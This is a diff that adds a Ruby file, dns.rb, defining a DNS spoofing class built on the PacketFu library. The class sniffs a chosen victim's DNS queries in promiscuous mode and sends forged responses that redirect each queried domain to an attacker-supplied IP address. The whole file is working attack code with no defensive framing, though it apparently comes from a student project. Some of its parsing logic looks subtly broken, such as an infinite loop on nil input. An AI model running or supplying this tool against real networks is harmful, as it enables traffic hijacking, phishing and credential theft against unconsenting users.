@@ -1,0 +1,190 @@
+#!/usr/bin/env ruby
+
+#-------------------------------------------------------------------------------
+# dns.rb
+#
+# DNS Spoofing Class
+#
+# Author: Jivanjot Brar & Shan Bains
+#
+# Functions:
+# initialize - initialize the class
+# send - sends spoof packets
+# start - start spoofing
+# get_domain - extracts the domain_name from the dns query packet
+# send_response - Create a DNS response packet and send it back to the victim
+# 
+#
+#-------------------------------------------------------------------------------
+require 'rubygems'
+require 'packetfu'
+
+class DNSSpoof
+
+    #---------------------------------------------------------------------------
+    # initialize
+    #
+    # Initialization of the DNSSpoofer Class
+    #
+    # spoof_ip - the IP address where the victim will be sent to
+    # victim_ip - Victim's IP
+    # victim_mac - Victim Machines mac address
+    # iface - NIC Device (default = "em1")
+    # spoof - true to start spoofing, false to not start (default = false)
+    #
+    #---------------------------------------------------------------------------    
+    def initialize(spoof_ip, victim_ip, victim_mac, iface = "em1", spoof = false)
+        @spoof_ip = spoof_ip
+        @victim_ip = victim_ip
+        #@victim_mac = PacketFu::Utils.arp(victim_ip, :iface => iface)
+        @victim_mac = victim_mac
+        @iface = iface
+        @cfg = PacketFu::Utils.whoami?(:iface => iface)
+        
+        if spoof then
+            start
+        end
+    end # initalize
+    
+    #---------------------------------------------------------------------------
+    # send
+    #
+    # packet - packet to send
+    # interface - interface to the send the packet on
+    #
+    # send spoof packets
+    #
+    #---------------------------------------------------------------------------    
+    def send(packet, interface)
+        packet.to_w(interface)
+    end # send(packet, interface)
+    
+    #---------------------------------------------------------------------------
+    # start
+    #
+    # Start DNS spoofing
+    #
+    #---------------------------------------------------------------------------
+    def start
+        # Check if already spoofing
+        if @running then
+            puts "Spoofer is already running."
+            return
+        end
+        
+        @running = true
+        
+        # Only capture DNS packets
+        filter = "udp and port 53 and src " + @victim_ip
+        
+        puts "Filter: #{filter}"
+                
+        cap = PacketFu::Capture.new(:iface => @iface, :start => true,
+                        :promisc => true, :filter => filter, :save => true)
+                        
+        puts "DNS Packet sniffing starting..."
+        
+        # Start packet sniffing
+        cap.stream.each do |pkt|
+     
+            if PacketFu::UDPPacket.can_parse?(pkt) then
+                @packet = PacketFu::Packet.parse(pkt)
+         
+#                dnsquery = @packet.payload[2].unpack('H*')[0].chr + @packet.payload[3].unpack('H*')[0].chr
+                dnsquery = @packet.payload[2].to_s + @packet.payload[3].to_s
+		puts "#{dnsquery}"
+                # Check if Query
+                if dnsquery == '10' then
+                    @domain_name = get_domain(@packet.payload[12..-1])
+                    
+                    # Check if domain name field is empty
+                    if @domain_name.nil? then
+                        puts "Empty domain name field"
+                        next
+                    end # @domain_name.nil?
+                    
+                    puts "Domain name: #{@domain_name}"
+                    
+		            send_response
+                    
+                end # dnsquery == '10' then
+            end # if pkt.canparse? then
+        end # cap stream.each do |pkt|
+    end # start
+    
+    #---------------------------------------------------------------------------
+    # get_domain
+    #
+    # Parse the DNS header and turn the domain name to a string
+    #
+    # payload - the payload of the DNS header
+    #
+    # returns domain name as a string
+    #---------------------------------------------------------------------------
+    def get_domain(payload)
+        domain_name = ""
+        while(true)
+	  
+	  if(payload == nil)
+	    next
+	  end
+	  
+            # Get length fields
+            #len = payload[0].unpack('H*')[0].to_i
+	    len = payload[0].to_i            
+
+            if len != 0 then
+                domain_name += payload[1, len] + "."
+                payload = payload[len + 1..-1]
+            else
+                domain_name = domain_name[0, domain_name.length - 1]
+                return domain_name
+            end # if len != 0 then
+        end # while(true)
+    end # get_domain(payload)
+    
+    #---------------------------------------------------------------------------
+    # send_response
+    #
+    # Create a DNS response packet and send it back to the victim
+    #---------------------------------------------------------------------------
+    def send_response
+	    # Create response packet
+        udp_packet = PacketFu::UDPPacket.new(:config => @cfg)
+        
+        udp_packet.udp_src   = @packet.udp_dst
+        udp_packet.udp_dst   = @packet.udp_src
+        udp_packet.eth_daddr = @victim_mac
+        udp_packet.ip_daddr  = @victim_ip
+        udp_packet.ip_saddr  = @packet.ip_daddr
+#        udp_packet.payload   = @packet.payload[0, 2].force_encoding("ASCII-8BIT")
+        udp_packet.payload   = @packet.payload[0, 2]
+        
+#        udp_packet.payload += "\x81\x80".force_encoding("ASCII-8BIT") + "\x00\x01".force_encoding("ASCII-8BIT") + "\x00\x01".force_encoding("ASCII-8BIT")
+#        udp_packet.payload += "\x00\x00".force_encoding("ASCII-8BIT") + "\x00\x00".force_encoding("ASCII-8BIT")
+
+        udp_packet.payload += "\x81\x80" + "\x00\x01" + "\x00\x01"
+        udp_packet.payload += "\x00\x00" + "\x00\x00"
+        
+        @domain_name.split('.').each do |part|
+            udp_packet.payload += part.length.chr
+            udp_packet.payload += part
+        end # @domain_name.split('.').each do |part|
+
+#        udp_packet.payload += "\x00\x00\x01\x00".force_encoding("ASCII-8BIT") + "\x01\xc0\x0c\x00".force_encoding("ASCII-8BIT")
+#        udp_packet.payload += "\x01\x00\x01\x00".force_encoding("ASCII-8BIT") + "\x00\x1b\xf9\x00".force_encoding("ASCII-8BIT") + "\x04".force_encoding("ASCII-8BIT")
+
+        udp_packet.payload += "\x00\x00\x01\x00" + "\x01\xc0\x0c\x00"
+        udp_packet.payload += "\x01\x00\x01\x00" + "\x00\x1b\xf9\x00" + "\x04"
+
+        
+        # Address
+        spoof_ip = @spoof_ip.split('.')
+#        udp_packet.payload += [spoof_ip[0].to_i, spoof_ip[1].to_i, spoof_ip[2].to_i, spoof_ip[3].to_i].pack('c*').force_encoding("ASCII-8BIT")
+        udp_packet.payload += [spoof_ip[0].to_i, spoof_ip[1].to_i, spoof_ip[2].to_i, spoof_ip[3].to_i].pack('c*')
+        
+        udp_packet.recalc
+         
+	send(udp_packet, @iface)   
+    end # send_response
+end
